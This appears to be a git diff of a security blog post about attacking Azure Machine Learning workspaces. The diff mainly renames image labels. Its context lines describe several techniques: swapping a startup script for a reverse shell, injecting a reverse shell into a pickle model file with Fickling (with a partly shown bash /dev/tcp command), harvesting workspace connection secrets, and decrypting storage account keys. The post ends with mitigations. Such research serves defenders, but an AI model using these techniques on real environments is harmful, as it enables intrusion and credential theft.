@@ -24,11 +24,11 @@ Azure ML provides a handy collection of tools for users of varying capabilities.
 
 To start working with Azure ML, we must first create a workspace. This is accomplished by creating an Azure ML resource in the Azure Portal. Once this resource is created, we can launch the Azure Machine Learning Studio from the portal to manage your machine learning projects.
 
-![azml_01]({{site.baseurl}}/assets/images/AZML/workspace_creation.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![workspace_creation]({{site.baseurl}}/assets/images/AZML/workspace_creation.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
 Each time a new workspace is created, several resources are automatically set up in the assigned resource group, including: Key Vault, Storage Account,Azure Container Registry (optional) and Application Insights.
 
-![azml_02]({{site.baseurl}}/assets/images/AZML/azml_resources.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![azml_resources]({{site.baseurl}}/assets/images/AZML/azml_resources.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
 In addition to these resources, Microsoft provides various built-in roles to manage access and permissions within Azure Machine Learning workspaces.  
 
@@ -51,27 +51,27 @@ The user can select from various compute targets:
 
 The image above illustrates an example of what a user can observe while utilizing a notebook on a compute instance created within the workspace.
 
-![azml_03]({{site.baseurl}}/assets/images/AZML/notebook.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![notebook]({{site.baseurl}}/assets/images/AZML/notebook.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
 Data scientists can run code in notebooks using different compute resources. One notable feature of Azure Machine Learning is the ability to assign each user a dedicated compute instance, ensuring that only they can access their machine. However, all files stored in the notebook section of the cloud are shared among users. This happens because all compute instances mount the same file share, allowing files to be accessible across multiple machines. When accessing a compute instance through Azure Machine Learning Studio or via SSH, two key directories are visible. The **cloudfiles** directory contains shared files available across all compute instances, while the **localfiles** directory holds files that are only accessible on the specific instance being used.
 
-![azml_04]({{site.baseurl}}/assets/images/AZML/compute_instance_file_share.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![compute_instance_file_share]({{site.baseurl}}/assets/images/AZML/compute_instance_file_share.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
 **So, where exactly is this shared storage located?**
 
 All files within the workspace, including notebooks, scripts, models, and snapshot logs, are stored in the Storage Account created during the workspace setup. This storage account features a file share that contains all scripts from the notebook page shared between compute instances, as well as blob storage that holds snapshot logs and models.
 
-![azml_05]({{site.baseurl}}/assets/images/AZML/storage_account.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![storage_account]({{site.baseurl}}/assets/images/AZML/storage_account.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
 In the file sharing, you can locate the Users directory, which contains all the files that can be access from the notebook page. 
 
-![azml_06]({{site.baseurl}}/assets/images/AZML/explore_storage.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![explore_storage]({{site.baseurl}}/assets/images/AZML/explore_storage.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
-![azml_07]({{site.baseurl}}/assets/images/AZML/file_share_mount.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![file_share_mount]({{site.baseurl}}/assets/images/AZML/file_share_mount.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
 It's important to point out that File Share relies solely on credential-based authentication.
 
-![azml_08]({{site.baseurl}}/assets/images/AZML/storage_credentials.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![storage_credentials]({{site.baseurl}}/assets/images/AZML/storage_credentials.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
 ## Privilege Escalation and Lateral Movement
 
@@ -86,15 +86,15 @@ An attacker can escalate privileges by gaining control over the storage within t
 The most straightforward way to escalate privileges with this method and gain access to Azure Machine Learning compute instances is by modifying the startup script. In Azure ML administrators can create custom setup scripts to configure compute instances in the workspace. By modifying the startup script, an attacker can inject malicious code to establish persistent access, exfiltrate data, or move laterally within the Azure environment. Administrators often configure these scripts to automate the customization and setup of compute instances during provisioning. The startup script executes each time the compute instance starts, with its working directory set to the location where the script was uploaded. For example, if the script is uploaded to `Users/admin`, its execution path on the compute instance would be `/home/azureuser/cloudfiles/code/Users/admin`. This setup enables the use of relative paths within the script. However, an attacker with access to the storage account or its access keys could overwrite this Bash script. This would potentially compromise all Azure Machine Learning compute instances where the script is configured to run. Because these scripts are stored in the cloud, they are typically designed to configure multiple machines across Azure ML, including installing libraries, defining environment settings, and applying specific configurations, making them an attractive target for exploitation.
 
 
-![azml_09]({{site.baseurl}}/assets/images/AZML/privilege_escalation_startup.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![privilege_escalation_startup]({{site.baseurl}}/assets/images/AZML/privilege_escalation_startup.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
 To exploit this, let’s assume an attacker has compromised a user with sufficient permissions to access the storage account, such as a Storage Account Contributor. In this scenario, the attacker has gained control of the user Ely and can locate the startup script within the File Share, replacing it with a malicious Bash script that includes a reverse shell. By substituting the original script, the attacker ensures that the malicious code executes automatically each time the compute instance starts, granting persistent access and enabling remote control over the instance. This approach effectively compromises the environment, allowing the attacker to escalate privileges, exfiltrate data, or pivot to other resources within the Azure infrastructure.
 
-![azml_10]({{site.baseurl}}/assets/images/AZML/ely_startup_script.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![ely_startup_script]({{site.baseurl}}/assets/images/AZML/ely_startup_script.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
 The attacker can locate a file named startup.sh, delete it, and replace it with a malicious file of the same name containing a reverse shell. When a compute instance is started or restarted, the attacker can gain a reverse shell on the machine. In this scenario, ngrok is used to expose a listener and establish the reverse shell connection. The attacker can then obtain a Managed Identity access token and leverage it to pivot to other systems.
 
-![azml_11]({{site.baseurl}}/assets/images/AZML/shell_startup.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![shell_startup]({{site.baseurl}}/assets/images/AZML/shell_startup.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
 #### Pickle File Injection: From Storage Account to Azure Container
 
@@ -102,7 +102,7 @@ A similar attack scenario can be executed using a .pkl file. In this case, if us
 
 As the first step, we identify the `model.pkl` file within the blob storage that we intend to inject with malicious code.
 
-![azml_12]({{site.baseurl}}/assets/images/AZML/storage_pkl.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![storage_pkl]({{site.baseurl}}/assets/images/AZML/storage_pkl.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
 After identifying the file, we download it and inject a reverse shell code with [Fickling]("https://github.com/trailofbits/fickling"). We can then overwrite the original `model.pkl` file in the blob with the compromised version containing the injected code. Once re-uploaded, the malicious code will execute whenever the model is deployed.
 
@@ -112,20 +112,19 @@ fickling --inject '__import__("subprocess").run(["bash", "-c", "bash -i >&/dev/t
 
 In this scenario, we assume data scientists decide to deploy the model to an Azure Container.
 
-![azml_13]({{site.baseurl}}/assets/images/AZML/container.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![container]({{site.baseurl}}/assets/images/AZML/container.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
 The attacker can then proceed to obtain the access token and use it to move laterally to other systems.
 
-![azml_14]({{site.baseurl}}/assets/images/AZML/shell_container.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![shell_container]({{site.baseurl}}/assets/images/AZML/shell_container.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
 ### Harvesting Credentials
 
 Having gained access to an Azure ML workspace, the million-dollar question is: what comes next? In this chapter, I will demonstrate how an attacker who has compromised a vulnerable Azure ML user account can move laterally to other systems by extracting stored credentials. Users with the Azure ML Data Scientist role can retrieve credentials from secrets stored within Azure Machine Learning. These secrets, such as API keys and authentication tokens, are primarily stored in Workspace Connections. This setup introduces a significant security risk: if an attacker gains control of a user with access to Azure ML, they can leverage these credentials to infiltrate other systems, escalate privileges, and exfiltrate sensitive data. A crucial detail overlooked is that credentials cannot be directly read from Azure Machine Learning Studio, they must be accessed via the API. This limitation can create a false sense of security for system administrators, who may assume that credentials stored in the workspace are protected. However, any user with the necessary permissions can still extract them through the API. Even more concerning, these credentials often provide access to external services such as S3 buckets, API connections, external AWS endpoints, and more. For an attacker, this is a goldmine, offering an easy path to further privilege escalation and lateral movement.  
 
-![azml_15]({{site.baseurl}}/assets/images/AZML/connection_01.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![connection_01]({{site.baseurl}}/assets/images/AZML/connection_01.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
-![azml_16]({{site.baseurl}}/assets/images/AZML/connection_02.png){:style="display:block; margin-left:auto; margin-right:auto"}
-
+![connection_02]({{site.baseurl}}/assets/images/AZML/connection_02.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
 ### Unlocking Storage Keys and Managed Identity
 
@@ -135,11 +134,13 @@ Before I finalize this post, there’s another aspect of Azure ML I'd like to di
 
 To authenticate to the file share, the agent uses a certificate and a private key, which are stored under `/mnt/batch/task/startup/certs/`. This setup allows the compute instances to access the storage account and share files, making it a potential attack vector for those who gain access to the compute instance.
 
-![azml_18]({{site.baseurl}}/assets/images/AZML/pfx_compute.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![cert_key_agent]({{site.baseurl}}/assets/images/AZML/cert_key_agent.png){:style="display:block; margin-left:auto; margin-right:auto"}
+
+![pfx_compute]({{site.baseurl}}/assets/images/AZML/pfx_compute.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
 Once the certificate is exported, we can generate a .pfx file. After that, we can load it into the Burp TLS client certificate. 
 
-![azml_19]({{site.baseurl}}/assets/images/AZML/burpsuite.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![burpsuite]({{site.baseurl}}/assets/images/AZML/burpsuite.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
 This enables us to make requests to the backend and retrieve the AccountKeyJWE, potentially gaining access to sensitive information, such as the storage account keys. We have several methods at our disposal: getworkspace, getworkspacesecrets, and getaadtoken. These methods can be used to retrieve the following:
 
@@ -147,11 +148,11 @@ This enables us to make requests to the backend and retrieve the AccountKeyJWE, 
 - **getworkspacesecrets**: The AccountKeyJWE.
 - **getaadtoken**: The Managed Identity of the compute instance.
 
-![azml_20]({{site.baseurl}}/assets/images/AZML/burp_01.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![burp_01]({{site.baseurl}}/assets/images/AZML/burp_01.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
-![azml_21]({{site.baseurl}}/assets/images/AZML/burp_02.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![burp_02]({{site.baseurl}}/assets/images/AZML/burp_02.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
-![azml_22]({{site.baseurl}}/assets/images/AZML/burp_03.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![burp_03]({{site.baseurl}}/assets/images/AZML/burp_03.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
 Let’s focus on getworkspacesecrets, which allows us to obtain the AccountKeyJWE. To decrypt the AccountKeyJWE, two additional values are required: 
 
@@ -160,17 +161,17 @@ Let’s focus on getworkspacesecrets, which allows us to obtain the AccountKeyJW
 
 These values can be found in the file `/mnt/batch/tasks/startup/wd/dsi/dsimountenv`.
 
-![azml_23]({{site.baseurl}}/assets/images/AZML/keys.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![keys]({{site.baseurl}}/assets/images/AZML/keys.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
 When we export this key, we can use the first key to decrypt the second one. Once decrypted, this key can then be used to decrypt the JWE and retrieve the storage account key.
 
-![azml_24]({{site.baseurl}}/assets/images/AZML/key_decryption.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![key_decryption]({{site.baseurl}}/assets/images/AZML/key_decryption.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
 It is now possible to retrieve the storage account access keys used by Azure Machine Learning, allowing us to access the File Share.
 
-![azml_25]({{site.baseurl}}/assets/images/AZML/access_key_01.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![access_key_01]({{site.baseurl}}/assets/images/AZML/access_key_01.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
-![azml_26]({{site.baseurl}}/assets/images/AZML/access_key_02.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![access_key_02]({{site.baseurl}}/assets/images/AZML/access_key_02.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
 A few weeks before this article, it seems that Microsoft decided to "fix" this issue by removing the encryption key from the environment files. It’s unclear whether this change will fully prevent the retrieval of a storage account access key after the compromise of a compute instance. However, since the file share still needs to be mounted on the compute instances, these instances must retrieve the access key in some way.
 
@@ -179,7 +180,7 @@ A few weeks before this article, it seems that Microsoft decided to "fix" this i
 
 The privilege escalation techniques discussed in this bog post exploit built-in functionalities that attackers could misuse to gain elevated permissions within Azure Machine Learning. Additionally, attackers may leverage these techniques to move laterally, using Azure Machine Learning as a pivot point to escalate privileges in other Azure services. To mitigate these risks, organizations can adopt best practices to optimize security in Azure Machine Learning. A simple yet effective measure is to enforce network isolation when creating new workspaces. 
 
-![azml_27]({{site.baseurl}}/assets/images/AZML/boost_security.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![azml_boost_security27]({{site.baseurl}}/assets/images/AZML/boost_security.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
 Microsoft provides detailed guidance in their documentation on securing Azure Machine Learning environments. Key recommendations include:
 - Secure the Workspace: Create a private endpoint for the Azure Machine Learning workspace, connecting it to a VNet via private IP addresses. Public access should only be enabled if absolutely necessary.
